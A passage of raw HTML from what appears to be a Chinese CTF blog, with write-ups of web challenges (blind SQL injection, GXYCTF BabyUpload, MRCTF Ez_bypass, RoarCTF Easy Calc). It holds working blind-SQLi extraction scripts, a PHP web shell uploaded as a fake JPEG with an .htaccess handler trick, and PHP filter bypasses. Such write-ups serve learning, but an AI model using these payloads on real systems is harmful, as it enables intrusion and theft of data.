class="hljs-string">&#x27;&#x27;</span><br>name=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">10</span>,<span class="hljs-number">12</span>):<br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        time.sleep(<span class="hljs-number">0.2</span>) <br>        payload = <span class="hljs-string">&#x27;1^(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)&#x27;</span>.<span class="hljs-built_in">format</span>(i,l)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;testing 数据库名称第:&quot;</span>,i,<span class="hljs-string">&quot;第个&quot;</span>,<span class="hljs-built_in">chr</span>(l),<span class="hljs-string">&quot;字符&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            name=name+<span class="hljs-built_in">chr</span>(l)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库名称：&quot;</span>,name)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># for i in range (1,l+1) :</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             database_name=database_name + s</span><br><span class="hljs-comment">#             print(&quot;第&quot;,i,&quot;个字符： &quot;,database_name)</span><br><span class="hljs-comment">#             break </span><br><br><span class="hljs-comment"># for l in range (1,1000):</span><br><span class="hljs-comment">#     time.sleep(0.05) </span><br><span class="hljs-comment">#     payload = &quot;1&amp;&amp;length((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()))=&#123;&#125; &quot;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;表名长度:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;全表名长度:&quot;,l)</span><br><span class="hljs-comment">#         break </span><br>    <br><span class="hljs-comment"># for i in range (1,l+1):</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         time.sleep(0.05) </span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; &quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             name=name + s</span><br><span class="hljs-comment">#             print(&quot;表名:&quot;,name)</span><br><span class="hljs-comment">#             break</span><br><br><span class="hljs-comment"># flag=&#x27;&#x27;</span><br><span class="hljs-comment"># for l in range (1,10000):</span><br><span class="hljs-comment">#     f=&#x27;&#x27;</span><br><span class="hljs-comment">#     for s in range (32,127):</span><br><span class="hljs-comment">#         time.sleep(0.08)</span><br><span class="hljs-comment">#         f=flag + chr(s)</span><br><span class="hljs-comment">#         payload = &#x27;1&amp;&amp;((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;.format(f)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             flag=flag + chr(s-1)</span><br><span class="hljs-comment">#             print(flag.lower)</span><br><span class="hljs-comment">#             break</span><br><br></code></pre></td></tr></table></figure><p>先跑出数据库名：<br>ctftraining<br>然后题目给了表明和列明，那直接爆flag就行，那我跑库名干什么？<br>就当测试吧  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># str= &quot;-./0123456789:;&lt;&gt;=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~#&quot;</span><br>url = <span class="hljs-string">&#x27;http://b74d121d-ae37-46c5-9e40-49750c875c6b.node5.buuoj.cn:81/index.php&#x27;</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> le <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    payload= <span class="hljs-string">&#x27;1^((length((select(flag)from(flag))))&lt;&#123;&#125;)&#x27;</span>.<span class="hljs-built_in">format</span>(le)<br>    data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>    re = requests.post(url,data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;测试flag长度中:&quot;</span>,le)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag长度为:&quot;</span>,le)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,le+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">32</span>,<span class="hljs-number">117</span>):<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        payload = <span class="hljs-string">&#x27;1^((ascii(substr((select(flag)from(flag)),&#123;&#125;,1)))=&#123;&#125;)&#x27;</span>.<span class="hljs-built_in">format</span>(i,l)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag名称第:&quot;</span>,i,<span class="hljs-string">&quot;个字符&quot;</span>,<span class="hljs-built_in">chr</span>(l),<span class="hljs-string">&#x27;    &#x27;</span>,flag)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            flag=flag+<span class="hljs-built_in">chr</span>(l)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:&quot;</span>,flag)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># for i in range (1,l+1) :</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             database_name=database_name + s</span><br><span class="hljs-comment">#             print(&quot;第&quot;,i,&quot;个字符： &quot;,database_name)</span><br><span class="hljs-comment">#             break </span><br><br><span class="hljs-comment"># for l in range (1,1000):</span><br><span class="hljs-comment">#     time.sleep(0.05) </span><br><span class="hljs-comment">#     payload = &quot;1&amp;&amp;length((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()))=&#123;&#125; &quot;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;表名长度:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;全表名长度:&quot;,l)</span><br><span class="hljs-comment">#         break </span><br>    <br><span class="hljs-comment"># for i in range (1,l+1):</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         time.sleep(0.05) </span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; &quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             name=name + s</span><br><span class="hljs-comment">#             print(&quot;表名:&quot;,name)</span><br><span class="hljs-comment">#             break</span><br><br><span class="hljs-comment"># flag=&#x27;&#x27;</span><br><span class="hljs-comment"># for l in range (1,10000):</span><br><span class="hljs-comment">#     f=&#x27;&#x27;</span><br><span class="hljs-comment">#     for s in range (32,127):</span><br><span class="hljs-comment">#         time.sleep(0.08)</span><br><span class="hljs-comment">#         f=flag + chr(s)</span><br><span class="hljs-comment">#         payload = &#x27;1&amp;&amp;((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;.format(f)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             flag=flag + chr(s-1)</span><br><span class="hljs-comment">#             print(flag.lower)</span><br><span class="hljs-comment">#             break</span><br></code></pre></td></tr></table></figure><p>可能是我昨晚做迷糊了，卡在length和substr里面用select需要再加一层括号里，卡了一个半小时，到凌晨3点半，<br>一道题做了三个半小时，道心破碎了；<br>至少最后独立做出来了；<br>flag{e53ac9ec-ab18-44e9-89b4-f1b39d8f813c}</p><h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>先传个🐎看看：  </p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">传php木马：<br>回显：后缀名不能有ph！<br><br>传正常png文件：<br>上传类型也太露骨了吧！<br><br>传<span class="hljs-keyword">jpg看看：</span><br><span class="hljs-keyword"></span>上传类型也太露骨了吧！<br></code></pre></td></tr></table></figure><p>不管了，bp抓包改  </p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xquery">Content-Disposition: form-data;<span class="hljs-built_in"> name</span>=<span class="hljs-string">&quot;uploaded&quot;</span>; filename=<span class="hljs-string">&quot;shell.jpeg&quot;</span><br>Content-Type: image/jpeg<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_POST[zhong]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><br>成功：<br>/var/www/html/upload/<span class="hljs-number">407</span>deea951641fdc86613277efecd816/shell.jpeg succesfully uploaded!<br></code></pre></td></tr></table></figure><p>在浏览器上访问成功，但是用蚂蚁连接不上，应该也是没目录没php解析的问题，<br>观察到服务器端为apache<br>那应该就是尝试.htaccess</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;uploaded&quot;</span>; <span class="hljs-attr">filename</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;.htaccess&quot;</span><br><span class="hljs-params">Content-Type:</span> image<span class="hljs-symbol">/jpeg</span><br><br>SetHandler application<span class="hljs-symbol">/x-httpd-php</span><br><br><span class="hljs-symbol">/var/www/html/upload/407deea951641fdc86613277efecd816/.htaccess</span> succesfully uploaded<span class="hljs-operator">!</span><br></code></pre></td></tr></table></figure><p>蚂蚁连接成功，在根目录找到flag<br>本来看到这串路径我还以为是随机目录之类的    </p><p>乘机试了一下，想在.htaccess文件中直接添加木马，结果连不上，可能是不行吧<br>在upload目录下搞得，还把环境搞坏了</p><h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>打开题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php">I put something in F12 <span class="hljs-keyword">for</span> you<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$id</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123; <span class="hljs-comment">//md5绕过，要求两个值不相等但是计算的md5相等，</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$passwd</span>))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;  <br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;Please input first<br></code></pre></td></tr></table></figure><p>第一先试一下数组绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?id[]=<span class="hljs-number">0</span>&amp;gg[]=<span class="hljs-number">1</span><br><br>You got the first steponly one way to get the flag<br></code></pre></td></tr></table></figure><p>然后添加post数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">?id[]=<span class="hljs-number">0</span>&amp;gg[]=<span class="hljs-number">1</span><br><br>passwd=<span class="hljs-number">1234567</span><br><br>You got the first stepYou can not get it !<br></code></pre></td></tr></table></figure><p>要对is_numeric进行绕过，源码里的：<br>if (!is_numeric($passwd))<br>是不能是纯数字意思<br>那passwd&#x3D;1234567aa，<br>拿到flag，  </p><h2 id="php比较绕过-is-numeric"><a href="#php比较绕过-is-numeric" class="headerlink" title="php比较绕过 is_numeric()"></a>php比较绕过 is_numeric()</h2><p>因为php对字符串类型与整数类型进行&#x3D;&#x3D;比较时会把字符串转化为整型数据，<br>此时<br>1234567aa 就会变为 1234567<br>实现比较</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-31</title>
    <link href="/2025/04/27/note-31/"/>
    <url>/2025/04/27/note-31/</url>
    
    <content type="html"><![CDATA[<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>进去后是个页面，输入计算式，计算结果，没见过类似的题目啊,f12，发现有个calu.php,访问得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//关闭错误报告</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);  <span class="hljs-comment">//如果num未被设置则显示源码</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后看别人的wp做<br><a href="https://blog.csdn.net/vanarrow/article/details/107976892">https://blog.csdn.net/vanarrow/article/details/107976892</a><br><a href="https://www.cnblogs.com/echoDetected/p/13091486.html">https://www.cnblogs.com/echoDetected/p/13091486.html</a>  </p><p>当传入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> num<br><span class="hljs-comment">//就能绕过正则匹配？</span><br><span class="hljs-comment">//此时的&quot;nmu&quot;不等于&quot; num&quot;,绕过了：</span><br><br><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br><br><span class="hljs-comment">//但是在eval里解析的时候会把空格移除，这样就能实现绕过</span><br></code></pre></td></tr></table></figure><p>在本地试了一下，确实是这样:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo&#x27;</span>. <span class="hljs-title function_ invoke__">phpinfo</span>().<span class="hljs-string">&#x27;;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo&#x27;</span>.<span class="hljs-string">&#x27; phpinfo()&#x27;</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>接下来总结别人的wp：<br>1.用” num”来绕过正则匹配；<br>2.var_dump函数来输出回显，用file_get_contents()来加载flag文件chr()函数来绕过非法字符；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">s=<span class="hljs-string">&#x27;&#x27;</span><br>s=s+<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;enter you str,then i will give you them ascii:\n&quot;</span>)<br>o=<span class="hljs-number">0</span> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>    o=<span class="hljs-built_in">ord</span>(i)<br>    <span class="hljs-built_in">print</span>(o)<br></code></pre></td></tr></table></figure><p>然后到做题：<br>查看根目录：</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sml">/calc.php? num=var_dump(scandir(chr(<span class="hljs-number">47</span>)))<br><br>回显：<br><span class="hljs-built_in">array</span>(<span class="hljs-number">24</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">10</span>) <span class="hljs-string">&quot;.dockerenv&quot;</span> [<span class="hljs-number">3</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;bin&quot;</span> [<span class="hljs-number">4</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;boot&quot;</span> [<span class="hljs-number">5</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;dev&quot;</span> [<span class="hljs-number">6</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;etc&quot;</span> [<span class="hljs-number">7</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;f1agg&quot;</span> [<span class="hljs-number">8</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;home&quot;</span> [<span class="hljs-number">9</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span 